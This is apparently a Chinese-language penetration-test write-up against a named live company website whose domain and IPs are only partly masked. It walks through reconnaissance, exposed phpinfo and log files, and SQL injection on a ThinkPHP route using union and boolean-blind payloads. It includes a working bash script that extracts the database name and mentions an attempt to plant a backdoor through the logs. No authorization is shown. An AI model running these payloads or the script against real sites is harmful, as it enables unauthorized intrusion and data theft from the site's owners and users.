**目标：www.d\*\*\*iy.com.cn**
## 信息收集
### 被动信息收集
用域名去查一下备案号
	![](file-20260826015600705.png)
用备案号去鹰图查资产：
	![](file-20260826015600706.png)
用网站title查询：
	![](file-20260826015600707.png)
	
	**到这里获取到了两个ip地址，三个域名，两个开发端口。**
查询DNS服务器
	![](file-20260826015600708.png)
	发现**Cloudflare 提供的权威 DNS 服务器**。
### （无CDN）主动信息收集
#### 网络层探测
**主机存活**
```bash
nmap -sn 36.***.**.57 8.***.***.168
```
- ![](file-20260826015600708%201.png)
 **端口扫描**
 ```bash
 nmap 36.***.**.57 8.***.***.168
 ```
- ![](file-20260826015600709.png)
**服务识别**
```bash
nmap -sV -O -p 80,81,110,143,25,22 36.***.**.57 8.***.***.168
```
- ![](file-20260826015600711.png)
#### Web应用分析（针对Web服务）
两个IP都开放了Web端口（80和81），对每个Web服务都做一次指纹识别和目录爆破。另外`www.sinoit.com.cn` 这个域名，它可能指向 `8.161.229.168:81` 上的不同网站。
**Web指纹识别**：
```bash
whatweb http://36.***.**.57
whatweb http://8.***.***.168
```
- ![](file-20260826015600712.png)
**目录爆破**：
```bash
gobuster dir -u http://36.111.81.57 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
- ![](file-20260826015600713.png)
```bash
gobuster dir -u http://www.sinoit.com.cn:81 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
- ![](file-20260826015600713%201.png)
****
**整理后超高价值：**
```
/phpinfo.php                        : 200 68236B   ← phpinfo 全暴露
/admin.php                          : 302 0B       ← 后台存在
/data.sql                           : 403 210B     ← 疑似sql脚本但被拦截
/Runtime/                           : 403 210B     ← 目录禁列但文件可直连
/Runtime/Logs/Home/26_08_23.log     : 200 828383B  ← 日志可下载！
/Runtime/Logs/Home/26_01_23.log     : 200 146480B  ← 历史日志也可下载
/Application/Common/Conf/config.php : 200 0B       ← Application 目录Web可达（PHP被执行，不泄露源码）
```
- /phpinfo.php
	![](file-20260826015600714.png)
- /admin.php  
	![](file-20260826015600716.png)
	![](file-20260826015600717.png)
- /Runtime/Logs/Home/26_08_23.log ==信息泄露==
	![](file-20260826015600718.png)
- ==/Application/Common/Conf/config.php==这是个可以解析的php文件说不定该路径具有执行php代码能力
	![](file-20260826015600719.png)
- /News
	![](file-20260826015600720.png)
- /admin.php/Login/verify/id/a_login_1.html**存在验证码遍历**
	![](file-20260826015600720%201.png)
	![](file-20260826015600721.png)
## SQL
信息收集部分在浏览器插件中发现大量的/n_id/107/c_id/59这种id这里可能有文章，去网上学习了一下，这是Thinkphp的”优美“传参方式**PATH 传参**
```http
http://example.com/News/show/n_id/107/c_id/59
/News/show:**路由路径**
n_id:**参数名**
107:**参数值**
c_id:**参数名**
59:**参数值**
翻译成常见形式：http://example.com/News/show?n_id=107&c_id=59
```
### SQL探测
```http
http://www.digitalsky.com.cn/News/show/n_id/107/c_id/59
```
- 正常![](file-20260826015600722.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%27/c_id/59
```
- 单引号破坏闭合
	![](file-20260826015600722%201.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%201=1/c_id/59
```
- 正常![](file-20260826015600723.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%201=2/c_id/59
```
- 这里明显缺东西了回显不同==这里基本敲定这里就是存在sql注入了==![](file-20260826015600724.png)
### 联合注入
```http
http://www.digitalsky.com.cn/News/show/n_id/-1)%20union%20select%201,2,schema(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--/c_id/59
```
- ![](file-20260826015600725.png)
### 盲注
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%20length(database())>4/c_id/59
```
- ![](file-20260826015600726.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%20length(database())>5/c_id/59
```
- ![](file-20260826015600727.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%20length(database())>6/c_id/59
```
- ![](file-20260826015600727%201.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%20length(database())>7/c_id/59
```
- ![](file-20260826015600728.png)
```http
http://www.digitalsky.com.cn/News/show/n_id/107%20and%20length(database())=6/c_id/59
```
- ![](file-20260826015600729.png)
==Content-Length:不是11402就是11358属于bool盲注==
#### 脚本爆破
```bash
# Exp.sh — 布尔盲注读取当前库名
# 用法: ./Exp.sh 
set -u

BASE="http://www.****.com.cn"
TPL="/News/show/n_id/107{}/c_id/59"   # {}为payload位置,该点实测零抖动
DELAY=0.5; TIMEOUT=15; MAX_REQ=120; MIN_SEP=30

REQ=0; SZ=0; TH=0; BS=0; STR=""; LEN=0

log(){ echo "$*"; }

req(){
  REQ=$((REQ+1))
  [ "$REQ" -gt "$MAX_REQ" ] && { log "[!] 请求达硬上限${MAX_REQ},中止"; exit 1; }
  SZ=$(curl -s -m "$TIMEOUT" -o /dev/null -w "%{size_download}" "$BASE$1")
  sleep "$DELAY"
}

enc(){ sed -e 's/ /%20/g' -e "s/'/%27/g" -e 's/>/%3E/g' -e 's/</%3C/g' -e 's/"/%22/g' <<< "$1"; }
mkurl(){ local p; p="$(enc "$1")"; echo "${TPL/\{\}/$p}"; }

cond(){ # 打印SQL与真假,并作为返回值
  req "$(mkurl " and $1")"
  local v=假; [ "$SZ" -gt "$TH" ] && v=真
  log "  SQL: SELECT * FROM qywx_news WHERE (n_id=107 and $1) LIMIT 1  ->  $v"
  [ "$v" = 真 ]
}

bs(){ # 二分求值: 最小使">值"为假的数即真实值
  local lo=$2 hi=$3 mid
  while [ "$lo" -lt "$hi" ]; do
    mid=$(( (lo+hi)/2 ))
    cond "$1>${mid}" && lo=$((mid+1)) || hi=$mid
  done
  BS=$lo
}

readstr(){ # 逐字符读出标量表达式,每个值判定完成即解码显示
  local e=$1 p c ch out=""
  bs "length($e)" 1 40; LEN=$BS
  log "  ==> 长度 = ${LEN}"
  for p in $(seq 1 "$LEN"); do
    bs "ascii(substr($e,${p},1))" 32 126; c=$BS
    ch=$(printf "\\$(printf '%03o' "$c")")
    log "  ==> 第${p}个字符 = '${ch}' (ascii=${c})"
    out="${out}${ch}"
  done
  STR=$out
}

log "====== $(date '+%F %T') $BASE ======"

req "$(mkurl " and 1=1")"; T=$SZ
req "$(mkurl " and 1=2")"; F=$SZ
TH=$(( (T+F)/2 ))
log "标定 1=1:${T}B / 1=2:${F}B / 阈值:${TH}B"
[ $(( T>F ? T-F : F-T )) -lt "$MIN_SEP" ] && { log "[!] 真假分离不足,可能已修复"; exit 1; }

log "-- 读取当前库 database() --"
readstr "database()"
log "当前库: ${STR} (长度${LEN})"
log "====== 完成 请求${REQ}/${MAX_REQ} ======"

```
![](file-20260826015600730.png)
#### 攻击原理猜测
**ThinkPHP 3.2 的控制器方法直接把 URL 路径参数拼进 SQL 语句，没有使用参数化查询。**
## phpinfo.php泄露
## 日志公开可读，尝试写入后门到日志中再利用文件包含解析未果

